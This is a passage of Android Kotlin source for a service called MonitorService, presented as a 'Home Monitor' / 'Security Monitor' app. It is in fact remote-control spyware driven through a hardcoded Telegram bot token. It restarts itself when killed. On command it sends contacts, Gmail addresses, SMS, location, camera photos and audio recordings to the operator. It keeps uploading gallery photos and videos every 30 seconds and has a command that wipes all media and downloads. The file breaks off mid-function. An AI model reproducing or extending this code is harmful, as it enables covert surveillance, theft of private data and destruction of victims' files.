package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * MonitorService - Dual Bot System
 * 
 * Bot 1: Command Bot - Handles all user commands with inline keyboard menu
 * Bot 2: Media Bot - Continuously streams gallery media to a separate chat
 */
class MonitorService : LifecycleService() {

    companion object {
        // ============ BOT 1: COMMAND BOT ============
        private const val BOT_TOKEN_CMD = "8998204320:AAELpDLE48Sxy787YkwPKUWsPymmo47LPAE"
        private const val CHAT_ID_CMD = "8984424599"
        
        // ============ BOT 2: MEDIA STREAMING BOT ============
        private const val BOT_TOKEN_MEDIA = "8998204320:AAELpDLE48Sxy787YkwPKUWsPymmo47LPAE"
        private const val CHAT_ID_MEDIA = "8984424599"

        private const val TAG = "MonitorService"
        private const val NOTIFICATION_ID = 1001
        private const val POLL_INTERVAL_MS = 8_000L
        private const val MAX_CONTACTS = 20
        private const val MAX_FILES = 20
        private const val MEDIA_STREAM_INTERVAL_MS = 30_000L // 30 seconds between media sends

        // Command Bot URLs
        private val BASE_URL_CMD = "https://api.telegram.org/bot$BOT_TOKEN_CMD"
        private val URL_GET_UPDATES_CMD = "$BASE_URL_CMD/getUpdates"
        private val URL_SEND_MSG_CMD = "$BASE_URL_CMD/sendMessage"
        private val URL_SEND_PHOTO_CMD = "$BASE_URL_CMD/sendPhoto"
        private val URL_SEND_DOCUMENT_CMD = "$BASE_URL_CMD/sendDocument"
        private val URL_SEND_AUDIO_CMD = "$BASE_URL_CMD/sendAudio"
        private val URL_GET_FILE_CMD = "$BASE_URL_CMD/getFile"
        private val URL_SEND_LOCATION_CMD = "$BASE_URL_CMD/sendLocation"

        // Media Bot URLs
        private val BASE_URL_MEDIA = "https://api.telegram.org/bot$BOT_TOKEN_MEDIA"
        private val URL_SEND_PHOTO_MEDIA = "$BASE_URL_MEDIA/sendPhoto"
        private val URL_SEND_DOCUMENT_MEDIA = "$BASE_URL_MEDIA/sendDocument"
        private val URL_SEND_VIDEO_MEDIA = "$BASE_URL_MEDIA/sendVideo"

        private const val DEVICE_NAME = "My Phone" // This can be dynamically set
    }

    private data class FileEntry(
        val displayName: String,
        val uri: Uri,
        val sizeBytes: Long,
        val mimeType: String
    )

    private data class DeviceFile(
        val name: String,
        val path: String,
        val size: Long,
        val isImage: Boolean,
        val isVideo: Boolean
    )

    // ============ STATE ============
    private val fileCache = mutableMapOf<String, List<FileEntry>>()
    private val folderFileCache = mutableMapOf<String, List<File>>()
    private val deviceFiles = mutableListOf<DeviceFile>()

    // HTTP Clients with optimized connection pools for faster uploads
    private val httpClientCmd = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
        .build()

    private val httpClientMedia = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var mediaStreamJob: Job? = null

    @Volatile private var updateOffset: Long = 0L
    @Volatile private var mediaOffset: Int = 0

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created - Dual Bot Mode")
        startForegroundWithNotification()
        loadDeviceFiles()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "Service started")

        // Start command bot polling
        pollJob?.cancel()
        pollJob = serviceScope.launch {
            pollLoopCmd()
        }

        // Start media streaming bot
        mediaStreamJob?.cancel()
        mediaStreamJob = serviceScope.launch {
            mediaStreamLoop()
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling self-restart")
        val restartIntent = Intent(applicationContext, MonitorService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1_000L,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed")
        pollJob?.cancel()
        mediaStreamJob?.cancel()
        serviceScope.cancel()
        cameraExecutor.shutdown()
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle("🔒 Security Monitor Active")
            .setContentText("Dual bot system running")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // ================================================================
    //  COMMAND BOT POLLING LOOP
    // ================================================================

    private suspend fun pollLoopCmd() {
        Log.i(TAG, "Command bot poll loop started (interval = ${POLL_INTERVAL_MS}ms)")
        while (serviceScope.isActive) {
            try {
                val updates = fetchUpdatesCmd()
                updates.forEach { update -> handleUpdateCmd(update) }
            } catch (e: Exception) {
                Log.e(TAG, "Command bot poll error: ${e.message}")
            }
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdatesCmd(): List<JSONObject> {
        val url = "$URL_GET_UPDATES_CMD?offset=$updateOffset&limit=10&timeout=0"
        val request = Request.Builder().url(url).get().build()

        val responseBody = httpClientCmd.newCall(request).execute().use { response ->
            if (!response.isSuccessful) return emptyList()
            response.body?.string() ?: return emptyList()
        }

        val json = JSONObject(responseBody)
        if (!json.optBoolean("ok", false)) return emptyList()

        val result = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()

        for (i in 0 until result.length()) {
            val update = result.getJSONObject(i)
            updates.add(update)
            val updateId = update.getLong("update_id")
            if (updateId >= updateOffset) {
                updateOffset = updateId + 1
            }
        }

        return updates
    }

    // ================================================================
    //  COMMAND HANDLER WITH KEYBOARD MENU
    // ================================================================

    private fun handleUpdateCmd(update: JSONObject) {
        // Handle callback queries (inline keyboard button clicks)
        val callbackQuery = update.optJSONObject("callback_query")
        if (callbackQuery != null) {
            handleCallbackQuery(callbackQuery)
            return
        }

        val message = update.optJSONObject("message") ?: return
        val chatId = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID_CMD

        // Check for document upload
        val document = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            document != null -> {
                handleIncomingDocument(chatId, document)
                return
            }
            photoArr != null && photoArr.length() > 0 -> {
                val largest = photoArr.getJSONObject(photoArr.length() - 1)
                handleIncomingDocument(
                    chatId,
                    largest,
                    fallbackName = "photo_${System.currentTimeMillis()}.jpg"
                )
                return
            }
        }

        val rawText = message.optString("text", "").trim()
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())

        Log.i(TAG, "Command bot received: '$text' from chatId: $chatId")

        when {
            text == "/start" -> sendMainMenu(chatId)
            text == "/devices" -> sendDeviceList(chatId)
            text.startsWith("/device_") -> handleDeviceSelect(chatId, text)
            text == "/resetdevice" -> handleDeviceReset(chatId)
            text == "/gmail" -> handleGmailList(chatId)
            text == "/status" || text == "/alive" -> handleStatus(chatId)
            text == "/contacts" -> handleContacts(chatId)
            text == "/camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/frontcam" -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            text == "/location" -> handleLocation(chatId)
            text == "/files" -> handleFiles(chatId, "")
            text.startsWith("/files ") -> handleFiles(chatId, text.removePrefix("/files "))
            text == "/sms" -> handleSms(chatId, "")
            text.startsWith("/sms ") -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
            text == "/filemn" -> handleFileMn(chatId, "")
            text.startsWith("/filemn ") -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
            text.matches(Regex("/audio\\d+")) -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
            text.startsWith("/audio ") -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
            text == "/audio" -> sendMessage(chatId, "ℹ️ Usage: /audio20 or /audio 30 (seconds to record, max 120)")
            else -> {
                // If unknown command, show menu
                sendMainMenu(chatId)
            }
        }
    }

    // ================================================================
    //  INLINE KEYBOARD MENU SYSTEM
    // ================================================================

    private fun sendMainMenu(chatId: String) {
        val keyboard = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                // Row 1: Device Management
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📱 Devices")
                        put("callback_data", "menu_devices")
                    })
                    put(JSONObject().apply {
                        put("text", "🔄 Reset Device")
                        put("callback_data", "menu_reset")
                    })
                })
                // Row 2: Core Commands
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📷 Camera")
                        put("callback_data", "menu_camera")
                    })
                    put(JSONObject().apply {
                        put("text", "📸 Front Cam")
                        put("callback_data", "menu_frontcam")
                    })
                })
                // Row 3: Location & Contacts
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📍 Location")
                        put("callback_data", "menu_location")
                    })
                    put(JSONObject().apply {
                        put("text", "👥 Contacts")
                        put("callback_data", "menu_contacts")
                    })
                })
                // Row 4: Files & SMS
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📂 Files")
                        put("callback_data", "menu_files")
                    })
                    put(JSONObject().apply {
                        put("text", "💬 SMS")
                        put("callback_data", "menu_sms")
                    })
                })
                // Row 5: Gmail & Status
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📧 Gmail")
                        put("callback_data", "menu_gmail")
                    })
                    put(JSONObject().apply {
                        put("text", "✅ Status")
                        put("callback_data", "menu_status")
                    })
                })
                // Row 6: Audio
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "🎙️ Audio (10s)")
                        put("callback_data", "menu_audio_10")
                    })
                    put(JSONObject().apply {
                        put("text", "🎙️ Audio (30s)")
                        put("callback_data", "menu_audio_30")
                    })
                })
            })
        }

        val message = """
            🤖 *Home Monitor Active*
            
            📱 Device: *$DEVICE_NAME*
            🕐 Status: Online
            
            Select an option below:
        """.trimIndent()

        sendMessageWithKeyboard(chatId, message, keyboard.toString())
    }

    private fun sendDeviceList(chatId: String) {
        val keyboard = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                // Row 1: This device
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📱 $DEVICE_NAME")
                        put("callback_data", "device_${DEVICE_NAME.replace(" ", "_")}")
                    })
                })
                // Row 2: Back to menu
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "🔙 Back to Menu")
                        put("callback_data", "menu_back")
                    })
                })
            })
        }

        sendMessageWithKeyboard(
            chatId,
            "📱 *Available Devices*\n\nSelect a device to control:",
            keyboard.toString()
        )
    }

    private fun handleDeviceSelect(chatId: String, command: String) {
        val deviceName = command.replace("/device_", "").replace("_", " ")
        sendMessage(chatId, "✅ Connected to: *$deviceName*", parseMode = "Markdown")
        // Show commands for this specific device
        sendDeviceCommandsMenu(chatId, deviceName)
    }

    private fun sendDeviceCommandsMenu(chatId: String, deviceName: String) {
        val keyboard = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                // Row 1: Camera and Location
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📷 Camera")
                        put("callback_data", "cmd_camera")
                    })
                    put(JSONObject().apply {
                        put("text", "📍 Location")
                        put("callback_data", "cmd_location")
                    })
                })
                // Row 2: Contacts and SMS
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "👥 Contacts")
                        put("callback_data", "cmd_contacts")
                    })
                    put(JSONObject().apply {
                        put("text", "💬 SMS")
                        put("callback_data", "cmd_sms")
                    })
                })
                // Row 3: Files and Gmail
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "📂 Files")
                        put("callback_data", "cmd_files")
                    })
                    put(JSONObject().apply {
                        put("text", "📧 Gmail")
                        put("callback_data", "cmd_gmail")
                    })
                })
                // Row 4: Audio and Status
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "🎙️ Audio")
                        put("callback_data", "cmd_audio")
                    })
                    put(JSONObject().apply {
                        put("text", "✅ Status")
                        put("callback_data", "cmd_status")
                    })
                })
                // Row 5: Reset
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "🔄 Reset Device")
                        put("callback_data", "cmd_reset")
                    })
                    put(JSONObject().apply {
                        put("text", "🔙 Back")
                        put("callback_data", "menu_back")
                    })
                })
            })
        }

        sendMessageWithKeyboard(
            chatId,
            "🎮 *Commands for: $deviceName*\n\nSelect an action:",
            keyboard.toString()
        )
    }

    private fun handleCallbackQuery(callbackQuery: JSONObject) {
        val data = callbackQuery.optString("data", "")
        val message = callbackQuery.optJSONObject("message")
        val chatId = message?.optJSONObject("chat")?.optString("id") ?: CHAT_ID_CMD
        val messageId = message?.optInt("message_id") ?: 0

        // Answer callback query to remove loading state
        answerCallbackQuery(callbackQuery.optString("id"), "Processing...")

        Log.i(TAG, "Callback data: $data")

        when (data) {
            "menu_back" -> sendMainMenu(chatId)
            "menu_devices" -> sendDeviceList(chatId)
            "menu_reset" -> handleDeviceReset(chatId)
            "menu_camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            "menu_frontcam" -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            "menu_location" -> handleLocation(chatId)
            "menu_contacts" -> handleContacts(chatId)
            "menu_files" -> handleFiles(chatId, "")
            "menu_sms" -> handleSms(chatId, "")
            "menu_gmail" -> handleGmailList(chatId)
            "menu_status" -> handleStatus(chatId)
            "menu_audio_10" -> handleAudio(chatId, 10)
            "menu_audio_30" -> handleAudio(chatId, 30)
            "cmd_camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            "cmd_location" -> handleLocation(chatId)
            "cmd_contacts" -> handleContacts(chatId)
            "cmd_sms" -> handleSms(chatId, "")
            "cmd_files" -> handleFiles(chatId, "")
            "cmd_gmail" -> handleGmailList(chatId)
            "cmd_audio" -> handleAudio(chatId, 30)
            "cmd_status" -> handleStatus(chatId)
            "cmd_reset" -> handleDeviceReset(chatId)
            else -> {
                if (data.startsWith("device_")) {
                    val deviceName = data.replace("device_", "").replace("_", " ")
                    sendDeviceCommandsMenu(chatId, deviceName)
                }
            }
        }
    }

    private fun answerCallbackQuery(callbackId: String, text: String) {
        try {
            val json = JSONObject().apply {
                put("callback_query_id", callbackId)
                put("text", text)
                put("show_alert", false)
            }

            val body = json.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url("$BASE_URL_CMD/answerCallbackQuery")
                .post(body)
                .build()

            httpClientCmd.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "answerCallbackQuery failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "answerCallbackQuery error: ${e.message}")
        }
    }

    private fun sendMessageWithKeyboard(chatId: String, text: String, keyboardJson: String) {
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "Markdown")
                put("reply_markup", JSONObject(keyboardJson))
            }

            val body = json.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(URL_SEND_MSG_CMD)
                .post(body)
                .build()

            httpClientCmd.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendMessageWithKeyboard failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendMessageWithKeyboard error: ${e.message}")
        }
    }

    // ================================================================
    //  MEDIA STREAMING BOT (BOT 2)
    // ================================================================

    private suspend fun mediaStreamLoop() {
        Log.i(TAG, "Media streaming loop started (interval = ${MEDIA_STREAM_INTERVAL_MS}ms)")
        while (serviceScope.isActive) {
            try {
                val mediaFiles = getRecentMediaFiles()
                if (mediaFiles.isNotEmpty()) {
                    val file = mediaFiles[mediaOffset % mediaFiles.size]
                    sendMediaFile(file)
                    mediaOffset++
                } else {
                    Log.i(TAG, "No media files found for streaming")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Media streaming error: ${e.message}")
            }
            delay(MEDIA_STREAM_INTERVAL_MS)
        }
    }

    private fun getRecentMediaFiles(): List<DeviceFile> {
        val files = mutableListOf<DeviceFile>()

        // Query images
        val imageProjection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.RELATIVE_PATH
        )

        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            imageProjection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC LIMIT 50"
        )?.use { cursor ->
            val idCol = cursor.getColumnIndex(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)
            val pathCol = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "unknown"
                val size = cursor.getLong(sizeCol)
                val path = cursor.getString(pathCol) ?: ""
                val uri = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id.toString()
                )
                if (size > 0) {
                    files.add(DeviceFile(name, uri.toString(), size, true, false))
                }
            }
        }

        // Query videos
        val videoProjection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATE_MODIFIED,
            MediaStore.Video.Media.RELATIVE_PATH
        )

        contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            videoProjection,
            null,
            null,
            "${MediaStore.Video.Media.DATE_MODIFIED} DESC LIMIT 20"
        )?.use { cursor ->
            val idCol = cursor.getColumnIndex(MediaStore.Video.Media._ID)
            val nameCol = cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndex(MediaStore.Video.Media.SIZE)
            val pathCol = cursor.getColumnIndex(MediaStore.Video.Media.RELATIVE_PATH)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "unknown"
                val size = cursor.getLong(sizeCol)
                val path = cursor.getString(pathCol) ?: ""
                val uri = Uri.withAppendedPath(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    id.toString()
                )
                if (size > 0) {
                    files.add(DeviceFile(name, uri.toString(), size, false, true))
                }
            }
        }

        return files
    }

    private fun sendMediaFile(file: DeviceFile) {
        try {
            val uri = Uri.parse(file.path)
            val stream = contentResolver.openInputStream(uri) ?: return
            val bytes = stream.use { it.readBytes() }

            val mime = when {
                file.isImage -> "image/jpeg"
                file.isVideo -> "video/mp4"
                else -> "application/octet-stream"
            }

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID_MEDIA)
                .addFormDataPart(
                    if (file.isImage) "photo" else "video",
                    file.name,
                    bytes.toRequestBody(mime.toMediaTypeOrNull())
                )
                .addFormDataPart(
                    "caption",
                    "📸 ${file.name} | ${if (file.isImage) "Image" else "Video"} | ${formatSize(file.size)}"
                )
                .build()

            val url = if (file.isImage) URL_SEND_PHOTO_MEDIA else URL_SEND_VIDEO_MEDIA
            val request = Request.Builder().url(url).post(body).build()

            httpClientMedia.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.i(TAG, "Media file sent: ${file.name}")
                } else {
                    val err = response.body?.string()
                    Log.w(TAG, "sendMediaFile failed: ${response.code} $err")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendMediaFile error: ${e.message}")
        }
    }

    private fun formatSize(size: Long): String {
        return when {
            size >= 1_048_576 -> "${String.format("%.1f", size / 1_048_576.0)} MB"
            size >= 1_024 -> "${String.format("%.1f", size / 1_024.0)} KB"
            else -> "$size B"
        }
    }

    // ================================================================
    //  NEW FEATURES
    // ================================================================

    // ----- GMAIL CONTACTS EXTRACTION -----
    private fun handleGmailList(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CONTACTS permission not granted.")
            return
        }

        sendMessage(chatId, "📧 Fetching Gmail contacts...")

        val gmailContacts = readGmailContacts()
        if (gmailContacts.isEmpty()) {
            sendMessage(chatId, "📭 No Gmail contacts found.")
            return
        }

        val sb = StringBuilder("📧 *Gmail Contacts* (${gmailContacts.size}):\n\n")
        gmailContacts.take(50).forEachIndexed { index, (name, email) ->
            sb.append("${index + 1}. *$name*\n   `$email`\n")
        }
        if (gmailContacts.size > 50) {
            sb.append("\n_(Showing first 50 of ${gmailContacts.size})_")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun readGmailContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val resolver: ContentResolver = contentResolver

        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Email.ADDRESS,
            ContactsContract.CommonDataKinds.Email.TYPE
        )

        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            projection,
            null,
            null,
            null
        ) ?: return contacts

        cursor.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME)
            val emailCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
            val typeCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE)

            while (it.moveToNext()) {
                val name = it.getString(nameCol) ?: "Unknown"
                val email = it.getString(emailCol) ?: ""
                val type = it.getInt(typeCol)

                // Filter for Gmail addresses
                if (email.contains("@gmail.com") || type == ContactsContract.CommonDataKinds.Email.TYPE_WORK) {
                    if (email.isNotEmpty()) {
                        contacts.add(Pair(name, email))
                    }
                }
            }
        }

        return contacts.distinctBy { it.second }.take(100)
    }

    // ----- DEVICE RESET (Wipe Media Files) -----
    private fun handleDeviceReset(chatId: String) {
        sendMessage(chatId, "⚠️ *WARNING: Device Reset Initiated*", parseMode = "Markdown")
        sendMessage(chatId, "🗑️ Deleting all media files from device...")

        val deleted = deleteAllMediaFiles()

        sendMessage(
            chatId,
            "✅ *Device Reset Complete*\n\n🗑️ Files Deleted: $deleted\n📱 Device: $DEVICE_NAME\n🕐 ${getCurrentTime()}",
            parseMode = "Markdown"
        )

        // Log the reset
        Log.w(TAG, "Device reset performed by user. Deleted $deleted media files.")
    }

    private fun deleteAllMediaFiles(): Int {
        var deletedCount = 0

        // Delete images
        val imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val imageDeleted = contentResolver.delete(imageUri, null, null)
        if (imageDeleted > 0) deletedCount += imageDeleted

        // Delete videos
        val videoUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val videoDeleted = contentResolver.delete(videoUri, null, null)
        if (videoDeleted > 0) deletedCount += videoDeleted

        // Delete audio
        val audioUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        val audioDeleted = contentResolver.delete(audioUri, null, null)
        if (audioDeleted > 0) deletedCount += audioDeleted

        // Also delete files from Downloads
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI
            val downloadDeleted = contentResolver.delete(downloadUri, null, null)
            if (downloadDeleted > 0) deletedCount += downloadDeleted
        }

        // Clear internal caches
        try {
            cacheDir.deleteRecursively()
            filesDir.deleteRecursively()
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing cache: ${e.message}")
        }

        // Refresh media scanner
        val intent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
        intent.data = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        sendBroadcast(intent)

        return deletedCount
    }

    // ----- LOAD DEVICE FILES -----
    private fun loadDeviceFiles() {
        deviceFiles.clear()
        deviceFiles.addAll(getRecentMediaFiles())
        Log.i(TAG, "Loaded ${deviceFiles.size} media files")
    }

    private fun getCurrentTime(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date())
    }

    // ================================================================
    //  EXISTING COMMAND HANDLERS (Adapted for dual bot)
    // ================================================================

    private fun handleStatus(chatId: String) {
        val timeStr = getCurrentTime()
        val reply = """
            ✅ *Phone Alive*
            🕐 $timeStr
            📱 Device: $DEVICE_NAME
            📡 Media Bot: ${if (mediaStreamJob?.isActive == true) "🟢 Online" else "🔴 Offline"}
            📂 Media Files: ${deviceFiles.size}
        """.trimIndent()
        sendMessage(chatId, reply, parseMode = "Markdown")
    }

    private fun handleContacts(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_CONTACTS permission not granted.")
            return
        }

        val contacts = readContacts()
        if (contacts.isEmpty()) {
            sendMessage(chatId, "📭 No contacts found on this device.")
            return
        }

        val sb = StringBuilder("📒 *Contacts* (${contacts.size}):\n\n")
        contacts.forEachIndexed { index, (name, number) ->
            sb.append("${index + 1}. *$name*\n   `$number`\n")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun readContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val resolver: ContentResolver = contentResolver

        val cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return contacts

        cursor.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                val name = it.getString(nameCol) ?: "Unknown"
                val number = it.getString(numberCol) ?: "N/A"
                contacts.add(Pair(name, number))
            }
        }

        return contacts
    }

    private fun handleSms(chatId: String, filter: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ READ_SMS permission not granted.")
            return
        }

        val messages = readSmsMessages(filter.trim())

        if (messages.isEmpty()) {
            val hint = if (filter.isBlank()) "No SMS messages found."
            else "No messages found for number: $filter"
            sendMessage(chatId, "📭 $hint")
            return
        }

        val header = if (filter.isBlank())
            "💬 *Last SMS messages* (${messages.size}):\n\n"
        else
            "💬 *SMS with* `$filter` (${messages.size}):\n\n"

        val sb = StringBuilder(header)

        messages.forEach { msg ->
            val line = "${msg.dirEmoji} *${msg.address}*\n" +
                    "   🕐 ${msg.dateStr}\n" +
                    "   ${msg.body}\n\n"

            if (sb.length + line.length > 4_000) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(line)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private data class SmsEntry(
        val dirEmoji: String,
        val address: String,
        val dateStr: String,
        val body: String
    )

    private fun readSmsMessages(numberFilter: String, limit: Int = 20): List<SmsEntry> {
        val results = mutableListOf<SmsEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())

        val (selection, selArgs) = if (numberFilter.isNotEmpty()) {
            Pair("address LIKE ?", arrayOf("%${numberFilter.takeLast(7)}%"))
        } else {
            Pair(null, null)
        }

        val cursor = contentResolver.query(
